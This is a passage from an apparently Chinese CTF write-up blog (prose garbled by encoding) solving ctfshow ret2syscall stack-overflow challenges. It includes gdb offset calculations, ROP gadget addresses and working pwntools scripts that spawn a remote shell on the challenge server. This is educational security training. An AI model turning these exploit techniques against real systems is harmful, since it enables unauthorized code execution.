</div><p>è¯•åŠå¤©çˆ†EOFï¼Œä¹Ÿæ˜¯æ— è¯­ï¼Œåæ¥æ‰çŸ¥é“æƒ³èµ·è¿™ä¸ªç¨‹åºæ˜¯é™æ€ç¼–è¯‘çš„ï¼Œè€Œè¿è¡Œç¨‹åºæ˜¯åŠ¨æ€çš„ï¼Œåœ¨IDAä¸Šå‘ˆç°çš„æ•°æ®å¯èƒ½æ˜¯æœ‰åå·®ï¼Œè¿™è®©æˆ‘æƒ³èµ·äº†ç¼“å†²åŒºå¤§å°ï¼Œå¯„å­˜å™¨espæ˜¯åŠ¨æ€å¯„å­˜å™¨ï¼Œ<strong>ebp-64h</strong>å¯èƒ½æ˜¯é”™è¯¯çš„ï¼Œäºæ˜¯æˆ‘å¼€å§‹ç”¨åŠ¨æ€è°ƒè¯•<code>pwngdb</code>ï¼Œæ—¢ç„¶getsæ˜¯æˆ‘ä»¬å”¯ä¸€èƒ½å’Œç¨‹åºäº¤äº’çš„åœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡getså‡½æ•°ï¼Œè¾“å…¥ä¸€äº›åƒåœ¾å€¼ï¼Œé‚£å°±aaaaå§ï¼Œåˆšå¥½4å­—èŠ‚ï¼ˆå»ºè®®ä¸è¦å¤ªå¤§ï¼Œä¸‡ä¸€æº¢å‡ºäº†ç¨‹åºå°±å´©æºƒäº†ï¼Œå½“ç„¶aaaã€ctfä¹Ÿè¡Œï¼‰ï¼Œè®©espæŠŠæˆ‘æ‰€è¾“å…¥çš„å€¼è¿èµ°ï¼Œè¿™ä¼šå°±èƒ½çœ‹åˆ°espçš„åœ°å€äº†ï¼Œç„¶åç”¨ebpåœ°å€å’Œå®ƒç›¸å‡å¾—åˆ°åç§»é‡äº†ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/266.png"
	width="1836"
	height="838"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/266_hu_a77d25f28c503b3f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/266_hu_97886add58639320.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="219"
		data-flex-basis="525px"
	
></p>
<p>åœ¨å³è¾¹çš„è¿è¡Œæ¡†ä¸Šï¼Œå…ˆç»™ç¨‹åºè¿›è¡Œbreak mainæŒ‡ä»¤ç»™mainå‡½æ•°æ–­ç‚¹è¿›è¡ŒåŠ¨æ€è°ƒè¯•å‡†å¤‡ï¼Œç„¶åå¼€å§‹äº†ï¼Œç”¨<code>n</code>æŒ‡ä»¤ï¼ˆä¹Ÿå°±æ˜¯nextç¼©å†™ï¼Œä¸€æ­¥æ­¥è¿›è¡Œï¼Œå·¦è¾¹çš„è°ƒè¯•æ¡†ä¹Ÿä¼šçœ‹åˆ°å˜åŒ–ï¼‰ï¼Œæ¥ç€å›è½¦æ¢è¡Œä¸€ç›´è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œï¼Œç›´åˆ°çœ‹åˆ°æœ‰ç†Ÿæ‚‰çš„ctfshowäº¤äº’ç•Œé¢å’Œè®©ä½ è¾“å…¥çš„äº¤äº’æ“ä½œæ—¶å°±å¯ä»¥äº†ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/267.png"
	width="1830"
	height="733"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/267_hu_53af3ccc1bf52b4e.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/267_hu_f8f1b70314387566.png 1024w"
	loading="lazy"
	
		alt="espåœ°å€ï¼š0xffffceec"
	
	
		class="gallery-image" 
		data-flex-grow="249"
		data-flex-basis="599px"
	
></p>
<p>è¿™æ—¶è¾“å…¥AAAAï¼Œå·¦è¾¹è·Ÿç€å˜åŒ–ï¼Œespåœ°å€å‡ºç°äº†ã€‚</p>
<p>æŸ¥è¯¢æ ˆå¸§åº•éƒ¨ebpå¯„å­˜å™¨åœ°å€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">info registers
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/268.png"
	width="810"
	height="718"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/268_hu_cdb1a5a742eaf8ff.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/268_hu_7b1f43937804a501.png 1024w"
	loading="lazy"
	
		alt="ebp:0xffffcf58"
	
	
		class="gallery-image" 
		data-flex-grow="112"
		data-flex-basis="270px"
	
></p>
<p>ebp - esp =&gt; 0xffffcf58 - 0xffffceec =&gt; 6C = 108</p>
<p>è¿™æ˜¯åç§»é‡ï¼Œå†è¦†ç›–ebpæœ¬èº«ï¼Œé‚£å°±æ˜¯112äº†</p>
<p>æœ€ç»ˆexpï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28266</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080bb196</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806eb90</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x80BE408</span>
</span></span><span class="line"><span class="cl"><span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x08049421</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">112</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">int_0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote class="alert alert-warn">
    <blockquote>
<p>æ‰€ä»¥è¯´åç»­çœ‹åˆ°é™æ€ç¼–è¯‘ä¸€å®šè¦å¤šæ³¨æ„åç§»é‡ï¼Œåç»­è¦ç†Ÿç»ƒè¿ç”¨pwngdbåŠ¨æ€è°ƒè¯•å’Œpwndbgã€‚</p>
</blockquote></blockquote>
<h3 id="pwn_072">PWN_072
</h3><p>é¢˜ç›®ï¼šæ¥ç€ç»ƒret2syscallï¼Œå¤šç³»ç»Ÿå‡½æ•°è°ƒç”¨ã€‚</p>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/270.png"
	width="785"
	height="200"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/270_hu_11c7119c01019f55.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/270_hu_e602151e18533c05.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="392"
		data-flex-basis="942px"
	
></p>
<p>32ä½å…³é—­æ ˆä¿æŠ¤ä¸PIEã€‚</p>
<p>IDAåˆ†æï¼Œä¾æ—§é™æ€ç¼–è¯‘ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/271.png"
	width="714"
	height="250"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/271_hu_fce3f959fda3fd0.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/271_hu_ee7f129c4ad1c729.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="285"
		data-flex-basis="685px"
	
></p>
<p>çœ‹åˆ°getså‡½æ•°ï¼Œå’Œä¸Šé¢˜å·®ä¸å¤šï¼Œéƒ½æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ã€‚</p>
<p>/bin/shåœ¨IDAä¸Šæœç´¢ä¸åˆ°ï¼Œä¸èƒ½è¿”å›åœ°å€æ‰§è¡Œgetshelläº†ï¼Œé‚£å°±æ‰¾å¦å¤–ä¸€ç§æ–¹æ³•ã€‚ç¡®å®éš¾æ‰¾ï¼Œreadè¡ç”Ÿå‡½æ•°å¾ˆå¤šï¼Œæ‰¾åˆ°ä¸ªå•çº¯â€œreadâ€çš„å‡½æ•°æ˜¯çœŸéš¾&hellip;&hellip;</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/272.png"
	width="1169"
	height="358"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/272_hu_d83895fa855b5b5b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/272_hu_adb2fe1b9c39c764.png 1024w"
	loading="lazy"
	
		alt="readå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="326"
		data-flex-basis="783px"
	
></p>
<p>ä¸ä¼šå°±ä¸¢ç»™AIå§ï¼Œè¿™ç¡®å®æœ‰ç‚¹éš¾å»è¯»æ‡‚&hellip;&hellip;</p>
<p><strong>æœ‰readå‡½æ•°é‚£æˆ‘ä»¬å¯ä»¥ç”¨å®ƒå»è¯»å–å­—ç¬¦ä¸²åˆ°å†…å­˜å‘ï¼Œåˆ©ç”¨readå‡½æ•°æ¥è¿›è¡Œæ‰‹åŠ¨å†™å…¥â€œ/bin/shâ€å­—ç¬¦ä¸²ã€‚</strong></p>
<p>åœ¨mainå‡½æ•°ä¸­æ²¡çœ‹åˆ°è°ƒç”¨readå‡½æ•°ï¼Œåªèƒ½æˆ‘ä»¬å†™expæ—¶åˆ©ç”¨syscallå»è°ƒç”¨readå‡½æ•°ï¼Œæ­é…gadgetså»è®©readé€šè¿‡å¯„å­˜å™¨å»è¯»å–/bin/shå­—ç¬¦ä¸²ã€‚å¯ä»¥çœ‹åˆ°readå‡½æ•°éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼ŒåŠ ä¸Šè‡ªèº«ç³»ç»Ÿè°ƒç”¨å·ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨eaxã€ebxã€ecxã€edxçš„gadgetsã€‚</p>
<p>gadgetæŸ¥è¯¢ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/273.png"
	width="1335"
	height="471"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/273_hu_f21142f753693b87.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/273_hu_4bc82d8f24bc116a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="283"
		data-flex-basis="680px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/274.png"
	width="1273"
	height="346"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/274_hu_20e73841a55bd7fd.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/274_hu_a5fd2ee60dfff618.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="367"
		data-flex-basis="883px"
	
></p>
<p>pop_edx_ecx_ebx_retï¼š0x0806ecb0</p>
<p>pop_eax_retï¼š0x080bb2c6</p>
<p>int 0x80ï¼š0x08049421</p>
<p>è°ƒç”¨readå‡½æ•°ï¼Œreadå‡½æ•°ç³»ç»Ÿè°ƒç”¨å·æ˜¯0x3ï¼Œç”¨eaxå¯„å­˜ï¼Œä¸‰ä¸ªå‚æ•°ç”¨ebxã€ecxã€edxåˆ†åˆ«æš‚æ—¶å¯„å­˜ï¼Œint 0x80å»å¼€å¯æ‰§è¡Œreadå‡½æ•°ï¼ŒæŠŠ<code>/bin/sh</code>å†™å…¥å†…å­˜bssæ®µåï¼Œæ¥ç€æ‰§è¡Œ<code>execve</code>å‡½æ•°ï¼Œä¹Ÿæ˜¯ç”¨ä¸€æ ·çš„gadgetsï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/275.png"
	width="1058"
	height="390"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/275_hu_de707a3a1df9d98.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/275_hu_e6147e0449921e7b.png 1024w"
	loading="lazy"
	
		alt="è¯»å…¥å­—ç¬¦ä¸²åˆ°bsså†…å­˜æ®µçš„èµ·å§‹åœ°å€:0x080eb000"
	
	
		class="gallery-image" 
		data-flex-grow="271"
		data-flex-basis="651px"
	
></p>
<blockquote class="alert alert-note">
    <blockquote>
<p>readå‡½æ•°çš„è§£é‡Šï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/277.png"
	width="725"
	height="299"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/277_hu_5928d148ef09be4f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/277_hu_4f0c279e6ad4b93d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="581px"
	
></p>
<ul>
<li><code>a1</code>ï¼šè¡¨ç¤ºæ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰ï¼Œæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶æè¿°ç¬¦æ˜¯ä¸€ä¸ªæŒ‡å‘å·²æ‰“å¼€æ–‡ä»¶çš„å¼•ç”¨ï¼Œå¸¸è§çš„å€¼æœ‰ï¼š</li>
<li><code>0</code> ä»£è¡¨æ ‡å‡†è¾“å…¥ï¼ˆ<code>stdin</code>ï¼‰ã€‚</li>
<li><code>1</code> ä»£è¡¨æ ‡å‡†è¾“å‡ºï¼ˆ<code>stdout</code>ï¼‰ã€‚</li>
<li><code>2</code> ä»£è¡¨æ ‡å‡†é”™è¯¯è¾“å‡ºï¼ˆ<code>stderr</code>ï¼‰ã€‚</li>
<li>å½“æ‰“å¼€ä¸€ä¸ªæ™®é€šæ–‡ä»¶æˆ–å…¶ä»–ç±»å‹çš„æ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿä¼šåˆ†é…ä¸€ä¸ªå¤§äº 2 çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</li>
<li><strong><code>a2</code></strong>ï¼šæŒ‡å‘ç”¨äºå­˜å‚¨è¯»å–æ•°æ®çš„ç¼“å†²åŒºçš„åœ°å€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»æ–‡ä»¶æè¿°ç¬¦ <code>a1</code> æ‰€æŒ‡å‘çš„æ–‡ä»¶ä¸­è¯»å–çš„æ•°æ®ï¼Œä¼šè¢«å­˜å‚¨åˆ° <code>a2</code> æ‰€æŒ‡å‘çš„å†…å­˜åŒºåŸŸä¸­ã€‚</li>
<li><strong><code>a3</code></strong>ï¼šè¡¨ç¤ºè¦è¯»å–çš„å­—èŠ‚æ•°ï¼Œå³æŒ‡å®šä»æ–‡ä»¶æè¿°ç¬¦ <code>a1</code> æ‰€æŒ‡å‘çš„æ–‡ä»¶ä¸­è¯»å–å¤šå°‘ä¸ªå­—èŠ‚çš„æ•°æ®åˆ° <code>a2</code> æ‰€æŒ‡å‘çš„ç¼“å†²åŒºä¸­ã€‚</li>
</ul>
<p>æ€»çš„æ¥è¯´ï¼Œ<code>read</code> å‡½æ•°çš„ä½œç”¨å°±æ˜¯ä»æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦æ‰€å¯¹åº”çš„æ–‡ä»¶ä¸­ï¼Œè¯»å–æŒ‡å®šå­—èŠ‚æ•°çš„æ•°æ®åˆ°ç»™å®šçš„ç¼“å†²åŒºä¸­ï¼Œå¹¶ä¸”åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œå¯¹å¼‚æ­¥å–æ¶ˆç­‰æƒ…å†µè¿›è¡Œäº†ä¸€å®šçš„å¤„ç†ã€‚</p>
</blockquote></blockquote>
<p>æƒ³èµ·ä¸Šä¸€é¢˜ï¼Œæˆ‘æ€•æœ‰å‘ï¼Œè¿˜ç‰¹å®šå»ç”¨pwngdbè°ƒäº†ä¸‹ï¼Œå‘ç°çœŸæœ‰çŒ«è…»ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/276.png"
	width="1836"
	height="784"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/276_hu_565afc3bc813c434.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/276_hu_19f03963b000ad83.png 1024w"
	loading="lazy"
	
		alt="åç§»é‡ä¸º40ï¼ˆåè¿›åˆ¶ï¼‰"
	
	
		class="gallery-image" 
		data-flex-grow="234"
		data-flex-basis="562px"
	
></p>
<p>è¿™ç¡®å®å’ŒIDAé™æ€åˆ†æçš„åç§»é‡å¤§å°ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä¸‹æ¬¡çœ‹åˆ°é™æ€ç¼–è¯‘çš„ç¨‹åºæˆ‘ç›´æ¥ç•™ä¸€æ‰‹å¿ƒçœ¼ç”¨pwngdbçœ‹ä¸€çœ¼åç§»é‡å…ˆğŸ˜„ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28266</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080bb2c6</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806ecb0</span>
</span></span><span class="line"><span class="cl"><span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x0806F350</span>
</span></span><span class="line"><span class="cl"><span class="n">bss</span> <span class="o">=</span> <span class="mh">0x080eb000</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">44</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">int_0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">int_0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;system?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>æ‰§è¡Œåï¼Œç¨‹åºä¼šé˜»å¡ç­‰å¾…ç”¨æˆ·è¾“å…¥ï¼Œæ­¤æ—¶å‘é€ <code>bin_sh = &quot;/bin/sh\x00&quot;</code>ï¼Œ<code>read</code> ä¼šå°†è¯¥å­—ç¬¦ä¸²å†™å…¥ <code>bss</code> æ®µï¼ˆ<code>0x080eb000</code> åœ°å€å¤„ï¼‰ï¼›</p>
<p>æ­¤æ—¶ <code>bss</code> åœ°å€æŒ‡å‘çš„å†…å®¹å°±æ˜¯ <code>&quot;/bin/sh\x00&quot;</code>ï¼Œæ»¡è¶³ <code>execve</code> å¯¹ â€œå‘½ä»¤è·¯å¾„å‚æ•°â€ çš„è¦æ±‚ã€‚</p>
</blockquote>
<h3 id="pwn_078">PWN_078
</h3><p><em>è¡¥å‘ret2syscall-x64</em></p>
<p>é¢˜ç›®ï¼š64ä½ret2syscallã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/426.png"
	width="740"
	height="198"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/426_hu_dc2d2ae5514bf57.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/426_hu_b718b92b506a93c7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="373"
		data-flex-basis="896px"
	
></p>
<p>64ä½ç¨‹åºï¼Œé™æ€ç¼–è¯‘ï¼›å¼€å¯NXéƒ¨åˆ†å¼€å¯RELROã€‚</p>
<p>IDA64åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/427.png"
	width="735"
	height="251"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/427_hu_f6c860713ef6d226.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/427_hu_751a8e7cfc166758.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="292"
		data-flex-basis="702px"
	
></p>
<p>è¿™é¢˜å› ä¸ºå¼€äº†NXï¼Œæ‰€ä»¥ä¸èƒ½æ³¨å…¥shellcodeäº†ï¼Œåªèƒ½ç”¨ret2syscallã€‚</p>
<p>ç¨‹åºæ˜¯64ä½ï¼Œå’Œ32ä½ä¸åŒçš„æ˜¯ï¼Œå‰6ä½å‚æ•°å®ƒéœ€è¦åˆ©ç”¨å¯„å­˜å™¨ä¼ å‚ï¼Œæ‰€ä»¥è¯´éœ€è¦æ„é€ ROPæ”»å‡»é“¾ï¼Œmainå‡½æ•°çœ‹åˆ°äº†getså‡½æ•°ï¼Œå°±æœ‰æ ˆæº¢å‡ºæ¼æ´ï¼Œåˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œè¿”å›åˆ°bsså¯æ‰§è¡Œæ®µï¼Œå¯ä»¥è°ƒç”¨<code>read</code>å‡½æ•°å°†ROPgadgetè¯»å…¥bssæ®µã€‚</p>
<p>readå‡½æ•°çš„è°ƒç”¨å·æ˜¯0x0ï¼Œreadå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼š<code>read(int fd, void *buf, size_t count);</code>ï¼Œç»ä¼ å‚åå°±æ˜¯<code>read(0, bss, 0x10);</code>0x10åè¿›åˆ¶æ˜¯16ï¼Œæˆ‘ä»¬æ³¨å…¥<code>/bin/sh</code>å¤–åŠ <code>\x00</code>ç»“æŸç¬¦å°±æ˜¯16å­—èŠ‚äº†ï¼Œbsså­—æ®µæ³¨æ„ä¸€ä¸‹<strong>é¡µå¯¹é½</strong>å°±å¥½ã€‚</p>
<p>ROPgadgetæŸ¥è¯¢æ‰€éœ€ä¼ å‚ç”¨çš„å¯„å­˜å™¨çš„gadgetæœ‰rdiã€rsiã€rdxã€raxï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/428.png"
	width="1301"
	height="585"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/428_hu_775110d658498df.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/428_hu_7949000ddcca4eb2.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="533px"
	
></p>
<p>æ³¨æ„.bssæ®µçš„<strong>é¡µå¯¹é½</strong>ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/430.png"
	width="1105"
	height="375"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/430_hu_a71faf4102ea85fe.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/430_hu_5043dc82b33d8f54.png 1024w"
	loading="lazy"
	
		alt="bss=0x6C2000"
	
	
		class="gallery-image" 
		data-flex-grow="294"
		data-flex-basis="707px"
	
></p>
<p>é‚£ä¹ˆpayloadï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
